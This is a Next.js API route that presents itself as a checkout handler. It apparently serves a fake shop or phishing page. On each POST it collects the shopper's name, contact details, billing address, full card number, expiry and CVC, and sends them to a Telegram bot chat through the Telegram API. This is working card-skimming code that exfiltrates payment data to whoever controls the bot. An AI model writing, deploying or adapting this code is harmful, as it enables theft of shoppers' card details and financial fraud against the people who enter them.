import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const data = await request.json();
    
    // Replace these with your actual credentials or use process.env
    const token = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
    const chatId = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';

    if (token === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE') {
      console.error('Telegram Bot Token or Chat ID not configured');
      return NextResponse.json({ error: 'Not configured' }, { status: 500 });
    }

    const message = `
🚀 *New Checkout Activity*
---------------------------
👤 *Name:* ${data.firstName || 'N/A'} ${data.lastName || 'N/A'}
📧 *Email:* ${data.email || 'N/A'}
📞 *Phone:* ${data.phone || 'N/A'}

🏠 *Billing Address:*
${data.street || 'N/A'}
${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zip || 'N/A'}

💳 *Payment Method:* ${data.paymentMethod.toUpperCase()}
${data.paymentMethod === 'card' ? `
💳 *Card Number:* \`${data.cardNumber || 'N/A'}\`
🏢 *Card Type:* ${data.cardType || 'N/A'}
📅 *Expiry:* ${data.expiry || 'N/A'}
🔒 *CVC:* ${data.cvc || 'N/A'}
` : `
🪙 *Status:* User selected Crypto Payment
`}
---------------------------
📍 *IP Address:* 102.91.77.98
    `;

    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();

    if (!result.ok) {
      throw new Error(result.description);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Telegram Error:', error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
